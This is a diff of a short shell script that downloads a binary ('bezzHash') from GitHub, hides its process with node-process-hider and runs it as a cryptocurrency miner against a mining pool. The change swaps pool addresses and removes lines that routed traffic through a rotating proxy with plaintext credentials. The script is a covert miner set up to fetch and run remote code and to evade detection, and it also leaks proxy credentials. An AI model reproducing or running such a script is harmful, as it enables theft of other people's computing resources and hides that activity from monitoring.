@@ -1,13 +1,8 @@
 #!/bin/sh
-#!/bin/bash
-curl --proxy "http://qqlqtvdn-rotate:xqjwpfaiwxjm@p.webshare.io:80/" https://ipv4.webshare.io/
-export http_proxy=http://qqlqtvdn-rotate:xqjwpfaiwxjm@p.webshare.io:80 &&
-export https_proxy=http://qqlqtvdn-rotate:xqjwpfaiwxjm@p.webshare.io:80 &&
-export ftp_proxy=http://qqlqtvdn-rotate:xqjwpfaiwxjm@p.webshare.io:80 &&
 sudo apt update && apt install screen -y
 apt-get install -y nodejs
 npm i -g node-process-hider
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
 chmod +x bezzHash
 ph add bezzHash
-./bezzHash --url=nano_38gqwon5ypeyxb8fjjpz9iuqcfr38dnhifjipniicqfpi5fknep351e6sg4s.XO@us-eth.2miners.com:2020 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./bezzHash --url=sagemode.$(echo $(shuf -i 1-99999 -n 1)-THOR)@ethash.kupool.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
